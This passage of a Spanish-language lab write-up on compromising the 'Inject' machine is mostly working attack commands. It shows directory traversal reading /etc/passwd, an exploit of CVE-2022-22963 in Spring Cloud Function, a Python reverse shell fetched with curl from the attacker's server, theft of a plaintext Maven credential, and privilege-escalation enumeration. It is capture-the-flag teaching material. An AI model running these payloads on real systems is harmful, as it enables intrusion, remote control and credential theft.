style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># mhil4ne@kali (bash)</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">curl</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">http://</span><span style="color:#B56959;--shiki-dark:#BABED8">$rhost</span><span style="color:#B56959;--shiki-dark:#C3E88D">:8080/show_image?img=../../../../../../etc/passwd</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">root:.x:0:0:root:/root:/bin/bash</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">daemon:.x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">bin:.x:2:2:bin:/bin:/usr/sbin/nologin</span></span>
<span class="line"><span style="color:#998418;--shiki-dark:#82AAFF">...</span></span></code></pre> 
<p>Aparentemente podemos usar este endpoint para leer archivos locales usando un payload genérico de directory traversal. Trasteando un poco más, descubrimos que también podemos listar directorios.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># mhil4ne@kali (bash)</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">curl</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">http://</span><span style="color:#B56959;--shiki-dark:#BABED8">$rhost</span><span style="color:#B56959;--shiki-dark:#C3E88D">:8080/show_image?img=../../../../../../</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">bin</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">boot</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">dev</span></span>
<span class="line"><span style="color:#998418;--shiki-dark:#82AAFF">...</span></span></code></pre> 
<h2 id="remote-code-execution">Remote Code Execution</h2>
<p>Encontremos el origen de la aplicación para poder buscar credenciales o una superficie de ataque adicional.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># mhil4ne@kali (bash)</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#82AAFF">inject_fetch</span><span style="color:#999999;--shiki-dark:#89DDFF">()</span><span style="color:#999999;--shiki-dark:#89DDFF"> {</span><span style="color:#59873A;--shiki-dark:#FFCB6B"> curl</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -sm</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 1</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">http://</span><span style="color:#B56959;--shiki-dark:#BABED8">$rhost</span><span style="color:#B56959;--shiki-dark:#C3E88D">:8080/show_image?img=</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B07D48;--shiki-dark:#BABED8;font-style:inherit;--shiki-dark-font-style:italic">$@</span><span style="color:#999999;--shiki-dark:#89DDFF">;</span><span style="color:#999999;--shiki-dark:#89DDFF"> }</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">inject_fetch</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ../</span><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"> # read parent directory</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">inject_fetch</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ../java</span><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"> # keep looking ...</span></span></code></pre> 
<p>Finalmente encontramos lo que parece ser la raíz del proyecto para la aplicación Java actual en <code>../../../</code>. Dentro de ese directorio, encontramos la configuración del proyecto Maven en pom.xml que contiene un par de huellas de software notables.</p>
<ul>
<li>org.springframework.boot 2.6.5</li>
<li>spring-cloud-function-web 3.2.2</li>
</ul>
<p>Si buscamos vulnerabilidades con cualquiera de las dos huellas, vemos referencias a un par de CVE diferentes. Confirmamos que Spring Cloud Function versión 3.2.2 es vulnerable a CVE-2022-22963 comprobando la descripción CVEDetails.</p>
<blockquote>
<p>En las versiones 3.1.6, 3.2.2 y versiones anteriores no compatibles de Spring Cloud Function, al utilizar la funcionalidad de enrutamiento es posible que un usuario proporcione un SpEL especialmente diseñado como expresión de enrutamiento que puede dar lugar a la ejecución remota de código y al acceso a recursos locales.</p>
</blockquote>
<p>Ya hay un número de exploits de prueba de concepto por ahí, pero decidí crear uno de todos modos aquí. Vamos a utilizar este programa para generar una shell inversa que responde a un oyente PwnCat.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># mhil4ne@kali (bash)</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">pwncat-cs</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -c</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &lt;(</span><span style="color:#998418;--shiki-dark:#82AAFF">echo</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">listen -m linux -H </span><span style="color:#B56959;--shiki-dark:#BABED8">$lhost</span><span style="color:#B56959;--shiki-dark:#C3E88D"> 443</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;)</span></span></code></pre> 
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># mhil4ne@kali (bash)</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">inject_fetch</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ../../../../../../usr/bin</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> |</span><span style="color:#59873A;--shiki-dark:#FFCB6B"> grep</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &#39;</span><span style="color:#B56959;--shiki-dark:#C3E88D">^python</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&#39;</span><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"> # python3 is installed</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BABED8">tmp</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#999999;--shiki-dark:#89DDFF">$(</span><span style="color:#59873A;--shiki-dark:#FFCB6B">mktemp</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -d</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">cat</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> &lt;&lt;</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> EOF</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> &gt;</span><span style="color:#B07D48;--shiki-dark:#BABED8"> $tmp</span><span style="color:#393A34;--shiki-dark:#BABED8">/index.html</span></span>
<span class="line"><span style="color:#B56959;--shiki-dark:#C3E88D">import os,pty,socket</span></span>
<span class="line"><span style="color:#B56959;--shiki-dark:#C3E88D">s=socket.socket()</span></span>
<span class="line"><span style="color:#B56959;--shiki-dark:#C3E88D">s.connect((&quot;</span><span style="color:#B56959;--shiki-dark:#BABED8">$lhost</span><span style="color:#B56959;--shiki-dark:#C3E88D">&quot;,443))</span></span>
<span class="line"><span style="color:#B56959;--shiki-dark:#C3E88D">[os.dup2(s.fileno(),f)for(f)in(0,1,2)]</span></span>
<span class="line"><span style="color:#B56959;--shiki-dark:#C3E88D">pty.spawn(&quot;bash&quot;)</span></span>
<span class="line"><span style="color:#B5695999;--shiki-dark:#89DDFF">EOF</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">python3</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -m</span><span style="color:#B56959;--shiki-dark:#C3E88D"> http.server</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> --bind</span><span style="color:#B07D48;--shiki-dark:#BABED8"> $lhost</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> --directory</span><span style="color:#B07D48;--shiki-dark:#BABED8"> $tmp</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 80</span><span style="color:#999999;--shiki-dark:#89DDFF"> &amp;</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">python3</span><span style="color:#B56959;--shiki-dark:#C3E88D"> CVE-2022-22963.py</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">http://</span><span style="color:#B56959;--shiki-dark:#BABED8">$rhost</span><span style="color:#B56959;--shiki-dark:#C3E88D">:8080</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">curl </span><span style="color:#B56959;--shiki-dark:#BABED8">$lhost</span><span style="color:#B56959;--shiki-dark:#C3E88D"> -o/tmp/_d</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">python3</span><span style="color:#B56959;--shiki-dark:#C3E88D"> CVE-2022-22963.py</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">http://</span><span style="color:#B56959;--shiki-dark:#BABED8">$rhost</span><span style="color:#B56959;--shiki-dark:#C3E88D">:8080</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">python3 /tmp/_d</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span></span></code></pre> 
<p>A continuación, debemos obtener una devolución de llamada a nuestro oyente en el puerto 443 como el usuario Frank.</p>
<h1 id="privilege-escalation">Privilege Escalation</h1>
<h2 id="frank">Frank</h2>
<p>Empezaremos explorando el sistema de ficheros empezando por el directorio home de frank</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># frank@inject (bash)</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">find</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ~</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -type</span><span style="color:#B56959;--shiki-dark:#C3E88D"> f</span></span>
<span class="line"></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">/home/frank/.bashrc</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">/home/frank/.m2/settings.xml</span></span>
<span class="line"><span style="color:#998418;--shiki-dark:#82AAFF">...</span></span></code></pre> 
<p>Hay un archivo de configuración de usuario Maven en ~/.m2/settings.xml que contiene las credenciales para el usuario phil.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">&lt;?</span><span style="color:#393A34;--shiki-dark:#BABED8">xml version=</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">1.0</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#393A34;--shiki-dark:#BABED8"> encoding=</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">UTF-8</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#AB5959;--shiki-dark:#89DDFF">?&gt;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">&lt;</span><span style="color:#393A34;--shiki-dark:#BABED8">settings xmlns=</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">http://maven.apache.org/POM/4.0.0</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#393A34;--shiki-dark:#BABED8"> xmlns:xsi=</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">http://www.w3.org/2001/XMLSchema-instance</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">        xsi:schemaLocation</span><span style="color:#393A34;--shiki-dark:#BABED8">=</span><span style="color:#59873A;--shiki-dark:#FFCB6B">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span><span style="color:#59873A;--shiki-dark:#FFCB6B">&gt;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">  &lt;</span><span style="color:#59873A;--shiki-dark:#FFCB6B">servers&gt;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">    &lt;</span><span style="color:#59873A;--shiki-dark:#FFCB6B">server&gt;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">      &lt;</span><span style="color:#59873A;--shiki-dark:#FFCB6B">id&gt;Inject&lt;/id&gt;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">      &lt;</span><span style="color:#59873A;--shiki-dark:#FFCB6B">username&gt;phil&lt;/username&gt;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">      &lt;</span><span style="color:#59873A;--shiki-dark:#FFCB6B">password&gt;DocPhillovestoInject123&lt;/password&gt;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">      &lt;</span><span style="color:#59873A;--shiki-dark:#FFCB6B">privateKey&gt;$</span><span style="color:#393A34;--shiki-dark:#BABED8">{user.home}</span><span style="color:#59873A;--shiki-dark:#FFCB6B">/.ssh/id_dsa&lt;/privateKey&gt;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">      &lt;</span><span style="color:#59873A;--shiki-dark:#FFCB6B">filePermissions&gt;660&lt;/filePermissions&gt;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">      &lt;</span><span style="color:#59873A;--shiki-dark:#FFCB6B">directoryPermissions&gt;660&lt;/directoryPermissions&gt;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">      &lt;</span><span style="color:#59873A;--shiki-dark:#FFCB6B">configuration&gt;&lt;/configuration&gt;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">    &lt;</span><span style="color:#59873A;--shiki-dark:#FFCB6B">/server&gt;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">  &lt;</span><span style="color:#59873A;--shiki-dark:#FFCB6B">/servers&gt;</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">&lt;</span><span style="color:#393A34;--shiki-dark:#BABED8">/settings</span><span style="color:#AB5959;--shiki-dark:#89DDFF">&gt;</span></span></code></pre> 
<h2 id="phil">Phil</h2>
<p>Iniciaremos sesión como phil con su usando la contraseña DocPhillovestoInject123, tomaremos la bandera de usuario, luego ejecutaremos algunos comandos simples de enumeración.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># phil@inject (bash)</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">sudo</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -l</span><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"> # no luck :(</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">id</span><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"> # staff group?</span></span></code></pre> 
<p>Con el comando id, descubre que phil es miembro de un grupo personalizado llamado staff. Veamos si este grupo tiene permisos especiales en el sistema de archivos.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># phil@inject (bash)</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">find</span><span style="color:#B56959;--shiki-dark:#C3E88D"> /</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -group</span><span style="color:#B56959;--shiki-dark:#C3E88D"> staff</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -ls</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> 2&gt;</span><span style="color:#B56959;--shiki-dark:#C3E88D">/dev/null</span></span></code></pre> 
<p>La entrada más notable es el directorio /opt/automation/tasks que concede privilegios de escritura al grupo staff. Dentro de esa carpeta hay un archivo de configuración de sólo lectura (playbook) para un marco de automatización de TI conocido como Ansible. Dado que esto tiene que ver con la automatización, sospechamos que hay un trabajo CRON o algo similar que utiliza esta carpeta a ciertos intervalos. Usaremos PSpy para monitorizar procesos y encontrar tareas programadas.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># mhil4ne@kali (PwnCat phil@inject)</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">upload</span><span style="color:#B56959;--shiki-dark:#C3E88D"> pspy</span><span style="color:#B56959;--shiki-dark:#C3E88D"> /home/phil</span></span></code></pre> 
